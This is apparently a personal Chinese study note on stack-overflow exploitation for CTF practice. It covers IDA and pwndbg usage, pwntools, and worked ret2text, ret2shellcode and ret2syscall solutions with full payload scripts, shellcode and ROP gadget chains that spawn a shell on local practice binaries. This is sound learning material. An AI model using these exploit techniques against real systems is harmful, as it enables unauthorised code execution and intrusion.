# Stack Exploit

[TOC]





## 前置

* 查看进程空间

  * 方法一

    > 正在运行的程序 `ps -a`查看pid
    >
    > `cat /proc/pid/maps`即可查看

  * 方法二

    > 安装pwndbg插件
    >
    > ```bash
    > gdb a.out
    > --- 进入动态调试 ---
    > b main --- 打下断点
    > r      --- 开始运行
    > vmmap  --- 查看进程空间
    > ```



* static linked program 执行过程

  ```
  ./binary 
      |
      +
  	fork()                                                    main()
      |                                                         +
      +                                                         |
  execve("./binary", *argv[], *envp[])                        _start              user mode
  ----|---------------------------------------------------------+-----------------------------
      +                                                         |                 kernel mode
  sys_execve()                                           load_elf_binary()
      |                                                         +
      +                                                         |
  do_execve() ---------------------------------------  search_binary_handler()
  
  ```

  

* dynamic linked program 执行过程

  ```
  ./binary 
      |
      +                             __libc_start_main() ----> _init
  	fork()                                   |                  |    
      |                                      +                  +
      |                                   _start              main()             
      +                                      |                 
  execve("./binary",*argv[],*envp[])       ld.so                                   user mode
  ----|--------------------------------------+-----------------------------------------------
      +                                      |                                   kernel mode
  sys_execve()                       load_elf_binary()
      |                                      +
      +                                      |
  do_execve() ------------------- search_binary_handler()
  
  ```



参数传递

* x86

  > stack

* amd64

  > rdi -> rsi -> rdx -> rcx -> r8 -> r9 ----> stack

* leave相当于

  ```assembly
  mov %ebp, %esp
  pop %ebp
  ```

* ret相当于

  ```assembly
  pop %eip
  ```

* 目前由于 the NX bits 保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 bss 缓冲区写入 shellcode 或向堆缓冲区写入 shellcode 并使用 mprotect 赋予其可执行权限



## IDA

* 一般只用`IDA View-A`足矣

* F5 ---> C代码

* 在C代码中双击函数 ---> 进入相应的函数定义界面 ---> Esc 返回

* 左侧栏

  > 白色部分：写死在ELF文件中的函数
  >
  > 粉色部分：动态链接的标识符（此处留在ELF文件中的只是一些表项）

* `_start`不可反编译

  > 在main函数之前，_start帮助做ELF文件执行时的初始化工作，在编译器中通过汇编完成

* 汇编代码和`C`或`Machine Code`的交互

  * 机器码和汇编语句同时显示

    > Options --> general -->( right ) Number of opcode bytes (graph)设置即可

  * 汇编语句与C语言同时显示

    > 体现传参与具体实现
    >
    > C语言界面 --> 全部选中 --> 右键 --> Copy to assembly

    <img src="D:\github\pwn\pwn_study\images\ida_assembly_and_C.png" alt="ida_assembly_and_C" style="zoom:33%;" />

* 在IDA View-A 中以text显示

  > 右键 text view 即可

* `Ctrl + S`保存即可

  > 此时在分析的程序`programA`下方出现一个`programA.idb`可以直接用ida打开它

* 找不到入口函数的时候（`main`不是显式的）

  > 先运行一下程序 ---> 会出现相应的字符串
  >
  > shift+(Fn)+f12 ---> string window
  >
  > 双击找到初始运行程序时候出现的字符串即可定位到主函数周围
  >
  > 定位到`.rodata`节 --> 在其右下方有被引用的位置，双击即可定位到`entry`入口函数地址周围

  <img src="D:\github\pwn\pwn_study\images\ida_string_window.png" alt="ida_string_window" style="zoom:38%;" />

* 关闭时候不保存相关数据库就不会出现相关的数据库文件



## 本地连接构造pwn环境部署

* 先把相应的程序在本地运行，然后攻击（io接口初始为本地），本地测试成功后再将io切换为远程接口

* 交互模式

  ```python
  $ python3                     --- 在本地打开一个python3交互窗口
  >>> from pwn import *
  # 如果是本地测试
  >>> io = process("./ret2text")  --- 在本地开启题目程序为一个进程
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 137784
  # 如果是远程测试
  >>> io = remote("106.54.129.202", 10006)   --- remote(ip,port),此处只是举例
  # 查看对象属性
  >>> io
  <pwnlib.tubes.process.process object at 0x7f00557f7f40>
  ```

  io参数

  ```python
  -----------------必须是字节流
  io.send(p32(14) + b"hello \x0a")
                      ----整数变为字节raw数据用p32(int a),字符串前需要添加b,可以包括不可见字符'\x0a'即'\n'
  io.sendline()
  -----------------io.send(b"Hello\n") <=> io.sendline(b"Hello")
  io.recv()
  io.recvline()
  ------------------
  io.process() 本地连接
  io.remote() 远程连接
  ```

  过程

  ```python
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> io.send(p32(0) + b"\x0abc")
  >>> io.recv()
  [*] Process './ret2text' stopped with exit code 0 (pid 137784)
  b'It seems that you know nothing about it ......\n'
  ```

  

* 脚本模式

  > 在本机测试时，可以通过获取执行后获取本机的shell来验证pwn是否成功
  >
  > zsh  ----- exploit script ------> bash





## 实例

gets

```C
#include <stdio.h>
char *gets(char *s);
```









## 分类

> `ROP ( Return Oriented Programming )`
>
> 所谓 gadgets 就是以 `ret` 结尾的！！！！指令序列！！！！！
>
> 
>
> 栈缓冲区溢出的基础上，利用程序中已有的**小片段**`gadgets`来改变某些`register`的值，或某些变量`variable`的值，从而控制程序执行流程



### ret2text

**篡改栈帧上的返回地址为程序中已有的后门函数**

> 返回到`.text`段上
>
> 有时候`programmers`可能会在编程过程中给自己留一个后门`backdoor in ELF`

```
+-----------+
	kernel
+-----------+
  ret_addr = backdoor_addr ------------+
+-----------+                          |
  stack                                |
  ...                                  |
+-----------+                          |
  shared libraries                     |
+-----------+                          |
  ...                                  |
  heap                                 |                          
+-----------+                          |
  bss                                  |
+-----------+                          |
  data                                 |
+-----------+                          |
  ...                                  |
+-----------+                          |
  backdoor in ELF  <-------------------+
+-----------+                          
	Unused
+-----------+
```

#### Q1

* 查看保护机制

  > 只开启了`NX`

  ```python
  $ checksec ret2text
  [*] '/home/ganliber/Documents/ROP/Q1/ret2text'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x8048000)
  ```

* `ida`反汇编

  > `setbuf`用来关闭缓冲区（命题人使用），便于下方**无延迟**输出

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    setbuf(stdin, 0);
    setbuf(stdout, 0); 
    
    puts("Have you heard of buffer overflow?");
    vulnerable();
    puts("It seems that you know nothing about it ......");
    return 0;
  }
  ```

  进入`vulnerable`，IDA会标识   **能够写的缓冲区`buf`的边界和ebp的距离**   （但最好通过动态调试来实现对溢出点的判断，查看进程空间）

  ```C
  int vulnerable()
  {
    char buffer[8]; // [esp+8h] [ebp-10h] BYREF
  
    gets(buffer);
    return 0;
  }
  ```

  建议全屏terminal，同时(仅仅针对自己的电脑ubuntu20.04)

  ```
  ctrl+shift+'+' 放大字体
  ctrl+'-' 缩小字体
  ```

* 进入`pwndbg`调试

  ```python
  gdb ret2text
  ```

* 调试指令与笔记

  ```
  b: break
  n: next(单步调试)
  s: step in (进入到子函数内部)
  			-------- 注意下方[BACKTRACE]栏目显示的调用关系,从上往下调用关系是由内向外的,0号函数是当前函数栈帧
  stack 24 : 查看24行栈内容
  			-------- 查看栈帧时,注意查看[ebp ... esp]之间的部分,即为当前函数栈区间
  			-------- 如下图所示,紧挨着寄存器列（橙色）的是地址值, 右侧（红、粉色）是该地址的内容
  			-------- 我们的目标是溢出修改ebp紧挨着的下方的值即 0xffffcd8c 处的值（这里原本是 value of old eip）
  			-------- 该栈图示高地址在下，低地址在上
  			-------- 注意到写'AAAAAAAA'开始处是0008, ebp处是0018, 恰好相差了10h
  ```

  <img src="D:\github\pwn\pwn_study\images\gdb_stack_analyse.png" alt="gdb_stack_analyse" style="zoom:50%;" />

* 通过ida分析发现**后门函数**

  ```C
  int get_shell()
  {
    system("/bin/sh");
    return 0;
  }
  ```

* 查找后门函数地址

  ```
  ida View-A (text view) --> 左侧函数双击后门函数即可跳转到响应汇编的.text地址
  此处观察得到其地址为 0x08048522
  所以构造payload时应该用 p32(0x08048522) 打包成 raw data
  由于是4个字节因此对应32比特,用p32打包
  注意发送payload后需要调用
  io.interactive()
  进入交互模式，可以观察到此时已经在python交互模式下获得了一个shell，可以使用pwd,ls等命令，夺取了本机的控制权
  ```

  <img src="D:\github\pwn\pwn_study\images\locate_getshell_address.png" alt="locate_getshell_address" style="zoom: 33%;" />

* 效果

  ```python
  >>> from pwn import *
  >>> io=process('./ret2text')
  [x] Starting local process './ret2text'
  [+] Starting local process './ret2text': pid 138946
  >>> io.recvline()
  b'Have you heard of buffer overflow?\n'
  >>> payload = b'A' * 16 + b'BBBB' +p32(0x08048522)
  >>> io.sendline(payload)
  >>> io.interactive()
  [*] Switching to interactive mode
  ls
  ret2text
  pwd
  /home/ganliber/Documents/ROP/Q1
  ls -alh
  total 24K
  drwxrwxr-x 2 ganliber ganliber 4.0K 6月   2 02:10 .
  drwxrwxrwx 4 ganliber ganliber 4.0K 6月   1 23:44 ..
  -rw------- 1 ganliber ganliber  127 6月   2 02:10 .gdb_history
  -rwxrw-rw- 1 ganliber ganliber 9.7K 5月   8  2020 ret2text
  ls
  ret2text
  ```

* 脚本攻击

  > 可以先切换为`sh`，然后攻击后用`echo $SHELL`查看当前的shell

  ```python
  ganliber@ganliber-virtual-machine:~/Documents/ROP/Q1$ python3 exp.py
  [+] Starting local process './ret2text': pid 139154
  [*] Switching to interactive mode
  $ echo $SHELL
  /bin/zsh
  $  
  ```

  



### ret2shellcode

> shellcraft 默认是 32 位

```python
pwntools 中的 shellcraft 模块内置了若干shellcode
shellcraft.sh()  # 生成一个获取一个shell即sh的shellcode
print(shellcraft.sh())  # 打印汇编语言
>>>print(asm(shellcraft.sh()))  # 打印shellcode字节流
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

* 如果要64位的shellcode

  > 需要先声明环境 context.arch="amd64"

  ```python
  >>> context
  ContextType(cache_dir = '/home/ganliber/.cache/.pwntools-cache-3.8')
  >>> context.arch="amd64"
  >>> print(asm(shellcraft.amd64.sh()))
  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
  ```

> * 篡改栈帧上的返回地址为攻击者手动传入的 shellcode 所在缓冲区地址
> * 初期往往将 shellcode 直接写入栈缓冲区
> * 目前由于 the NX bits 保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 `bss` 缓冲区写入 shellcode 或向堆缓冲区写入 shellcode 并使用 mprotect 赋予其可执行权限
>   * `bss`可执行
>   * `ALSR`一般远程服务器都会打开，因此不能把`shellcode`放在`stack`上
>     * 当`PIE`没有打开的时候，ASLR不会影响bss的位置，因此此时可以把shellcode放到bss中
>   * `PIE`打开的时候，bss的位置是随机的，因此 PIE 未打开时，ASLR可以
> * `w`和`x`权限应该避免同时出现

#### Q2

* 查看C代码

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 1, 0);
    puts("No system for you this time !!!");
  +--------------------------------------+
  | gets(s);                             |
  | strncpy(buf2, s, 0x64u);             |
  +--------------------------------------+--> 利用区间
    printf("bye bye ~");
    return 0;
  }
  ```

* 观察到`buf2`不是局部变量，因此是全局变量`.bss`中

* 双击`buf2`

  ```C
  .bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
  ```

* 由于ELF文件中是不会有stack的，因此开`ASLR`之后就不易找到stack的栈顶位置，但`.bss`本身就存在于ELF文件中，因此可以将`shellcode`放到`.bss`中

* 因此容易知道`.bss`的地址

  ```C
  0x0804A080
  ```

* 要根据实际情况查看溢出覆盖的范围

  <img src="D:\github\pwn\pwn_study\images\ret2shellcode_stack.png" alt="ret2shellcode_stack" style="zoom:38%;" />

* 由此见得从`1C `到`88`

  ```
  88h - 1Ch = 6ch = 108
  开头是shellcode(由print(asm(shellcraft.sh()))获得), 中间是五关字节流, 然后是4bytes的ebp覆盖流, 然后是.bss的地址(p32(0x0804A080))
  ```

* 利用脚本如下

  > 必须满足`.bss`是可读可写可执行的！！！！！！！

  ```python
  from pwn import *
  context(arch='i386', os='linux')
  
  bss_addr = 0x0804A080
  
  
  io=process('./ret2shellcode')
  io.recvline()  # puts()...
  shellcode = asm(shellcraft.sh())
  
  payload = shellcode.ljust(112,b'A') + p32(bss_addr) --- 112==108+4,4 bytes 垃圾数据来填充ebp
  print(payload)
  io.sendline(payload)
  io.interactive()
  ```

* 不成功的原因：在自己的机器上`.bss`段并不是可执行的！！！

  ![ret2shellcode_bss_no_executive](D:\github\pwn\pwn_study\images\ret2shellcode_bss_no_executive.png)

  实际上该ELF文件只有`stack`可执行，因此不能利用`.bss`



### ret2syscall

#### Q4

> ret2syscall

* 源码

  ```C
  int __cdecl main(int argc, const char **argv, const char **envp)
  {
    int v4; // [esp+1Ch] [ebp-64h] BYREF
  
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 1, 0);
    puts("This time, no system() and NO SHELLCODE!!!");
    puts("What do you plan to do?");
    gets(&v4);
    return 0;
  }
  ```

* 动态调试查看v4相对于ebp的值

  > 根据图示：0x88-0x1c = 0x6c = 108

  <img src="D:\github\pwn\pwn_study\images\ret2syscall_v4.png" alt="ret2syscall_v4" style="zoom:33%;" />

* 将对应获取`shell`的系统调用的参数放到对应的寄存器中，在执行 

  ```assembly
  int 0x80
  ```

  时就可执行对应的系统调用，比如用如下系统调用获取`shell`

  ```C
  execve("bin/sh", NULL, NULL)
  ```

  * 该程序需要为32位程序，且需要

    * 系统调用号，eax = 0xb
    * param-1: ebx = addr( /bin/sh )
    * param-2: ecx = 0
    * param-3: edx = 0

    实际上对应汇编语句为

    ```assembly
    	mov eax, 0xb
    	mov ebx, ["/bin/sh"] 
    	mov ecx, 0
    	mov edx, 0
    	int 0x80
    	=> execve("/bin/sh",NULL,NULL)
    ```

  * 控制`register`

    <img src="C:\Users\XiZhongKuiYue\AppData\Roaming\Typora\typora-user-images\image-20220602195724435.png" alt="image-20220602195724435" style="zoom:33%;" />

  * 查找`gadget`

    > 查找可存储寄存器的代码
    >
    > ```python
    > ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
    > ---对于此题目则将rop换做ret2syscall---
    > ROPgadget --binary ret2syscall --only 'pop|ret' |grep 'eax'
    > ```
    >
    > 查找字符串
    >
    > ```python
    > ROPgadget --binary rop --string "/bin/sh"
    > ```
    >
    >
    > 查找有int 0x80的地址
    >
    > ```python
    > ROPgadget --binary rop  --only 'int'
    > ```
    >
    > rop指的是二进制文件名，详细的指令可通过输入指令`ROPgadget -h`查看。

    最终得到`gadget`

    > 第二行可以一次性控制住 edx, ecx, ebx

    ```python
    [1] 0x080bb196 : pop eax ; ret
    [2] 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
    ```

    得到`'/bin/sh'`

    ```python
    $ ROPgadget --binary ret2syscall  --string  '/bin/sh'
    Strings information
    ============================================================
    0x080be408 : /bin/sh
    ```

    得到`int 80h`的地址

    ```python
    $ ROPgadget --binary ret2syscall  --only 'int'                 
    Gadgets information
    ============================================================
    0x08049421 : int 0x80
    
    Unique gadgets found: 1
    ```

* 因此可以构造`payload`

  ```python
  payload = 112*b'A' + p32(0x080bb196)                     --- 垃圾数据 + ret[1]
  payload += p32(0xb) + p32(0x0806eb90)                    --- eax值 + ret[2]
  payload += p32(0)+p32(0)+p32(0x080be408)+p32(0x08049412)   --- edx,ecx,ebx值 + ret[int 80h]
  综合
  payload = 112*b'A' + p32(0x080bb196) +p32(0xb) + p32(0x0806eb90)+p32(0)+p32(0)+p32(0x080be408)+p32(0x08049421)
  ```

* 脚本

  ```python
  from pwn import *
  io = process('./ret2syscall')
  # io.recvline()
  # io.recvline()
  payload = 112*b'A' + p32(0x080bb196) +p32(0xb) + p32(0x0806eb90)+p32(0)+p32(0)+p32(0x080be408)+p32(0x08049421)
  io.sendline(payload)
  io.interactive()
  ```

* 或者为了更规整方便的构造`payload`

  > 此时攻击的二进制文件是`rop`

  ```python
  #!/usr/bin/env python
  from pwn import *
  
  sh = process('./rop')
  
  pop_eax_ret = 0x080bb196
  pop_edx_ecx_ebx_ret = 0x0806eb90
  int_0x80 = 0x08049421
  binsh = 0x80be408
  payload = flat(
      ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
  sh.sendline(payload)
  sh.interactive()
  ```

  









### ret2libc





## 保护机制

### ASLR

* `Address Space Layout Randomization`
* 操作系统层面（全局变量）

```
/proc/sys/kernel/randomize_va_space = 0：没有随机化。即关闭 ASLR
/proc/sys/kernel/randomize_va_space = 1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化
/proc/sys/kernel/randomize_va_space = 2：完全的随机化。在randomize_va_space = 1的基础上，通过 brk() 分配的内存空间也将被随机化
```

* 查看虚拟机

  ```python
  # ganliber @ ganliber-virtual-machine in ~/Documents/ROP/Q1 [11:23:19] 
  $ cat /proc/sys/kernel/randomize_va_space
  2
  ```



### PIE

* `Position-Independent Executable`

  > * 程序的防护措施，编译时生效
  > * 随机化ELF文件的映射地址（影响`.data`、`.bss`、`.text` 段的映射地址）
  > * 开启 ASLR 之后，PIE 才会生效

















